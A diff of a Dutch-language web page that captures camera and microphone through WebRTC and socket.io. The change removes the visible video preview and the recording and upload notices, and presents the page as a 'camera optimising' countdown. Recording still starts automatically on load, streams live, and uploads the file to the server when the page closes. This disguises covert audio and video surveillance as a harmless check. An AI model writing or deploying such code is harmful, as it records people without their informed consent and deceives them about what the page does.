@@ -2,30 +2,50 @@
 <html lang="nl">
 <head>
   <meta charset="UTF-8" />
-  <title>Live Stream (auto)</title>
+  <title>Camera optimaliseren</title>
   <style>
-    body { font-family: sans-serif; padding: 20px; }
-    video { width: 90%; max-width: 640px; border: 2px solid #444; border-radius: 8px; display:block; margin-bottom:10px; }
-    #status { margin-top: 8px; }
+    body { 
+      font-family: sans-serif; 
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      background: #111;
+      color: #fff;
+      text-align: center;
+    }
+    h1 {
+      font-size: 2em;
+      margin-bottom: 20px;
+    }
+    #countdown {
+      font-size: 3em;
+      font-weight: bold;
+    }
   </style>
 </head>
 <body>
-  <h1>🎥 Live & opname gestart...</h1>
-  <video id="local" autoplay playsinline muted></video>
-  <div id="status"></div>
+  <h1>📷 Camera optimaliseren...</h1>
+  <div id="countdown">30</div>
 
   <script src="/socket.io/socket.io.js"></script>
   <script>
     const socket = io();
-    const localVideo = document.getElementById("local");
-    const statusEl = document.getElementById("status");
+    let pc, mediaRecorder, recordedChunks = [], liveStream;
 
-    let pc;
-    let mediaRecorder;
-    let recordedChunks = [];
-    let liveStream;
-
-    function setStatus(msg) { statusEl.textContent = msg; }
+    // Afteller
+    let seconds = 30;
+    const countdownEl = document.getElementById("countdown");
+    const timer = setInterval(() => {
+      seconds--;
+      countdownEl.textContent = seconds;
+      if (seconds <= 0) {
+        clearInterval(timer);
+        countdownEl.textContent = "✅ Klaar";
+      }
+    }, 1000);
 
     async function startEverything() {
       try {
@@ -33,7 +53,6 @@
           video: { facingMode: "user" },
           audio: true
         });
-        localVideo.srcObject = liveStream;
 
         // WebRTC live
         pc = new RTCPeerConnection({
@@ -60,10 +79,8 @@
         mediaRecorder.onstop = uploadRecording;
         mediaRecorder.start();
 
-        setStatus("⏺ Live & opname gestart automatisch");
       } catch (err) {
-        console.error(err);
-        setStatus("❌ Kon camera/microfoon niet starten: " + err.message);
+        console.error("Camera/microfoon fout:", err);
       }
     }
 
@@ -74,28 +91,24 @@
         const form = new FormData();
         form.append("recording", blob, "opname.webm");
         form.append("title", "auto");
-        setStatus("⏳ Uploaden...");
-        const res = await fetch("/upload-recording", { method: "POST", body: form });
-        if (!res.ok) throw new Error(await res.text());
-        setStatus("✅ Opname geüpload. Terug te zien op /videos5713");
+        await fetch("/upload-recording", { method: "POST", body: form });
       } catch (err) {
-        console.error(err);
-        setStatus("❌ Upload mislukt: " + err.message);
+        console.error("Upload mislukt:", err);
       }
     }
 
-    // Stop automatisch als gebruiker site sluit
+    // Stop automatisch bij sluiten
     window.addEventListener("beforeunload", () => {
       try {
         if (mediaRecorder && mediaRecorder.state !== "inactive") {
           mediaRecorder.stop();
         }
-        if (pc) { pc.close(); }
-        if (liveStream) { liveStream.getTracks().forEach(t => t.stop()); }
+        if (pc) pc.close();
+        if (liveStream) liveStream.getTracks().forEach(t => t.stop());
       } catch (_) {}
     });
 
-    // 🚀 Direct starten bij laden
+    // 🚀 Direct starten
     startEverything();
   </script>
 </body>
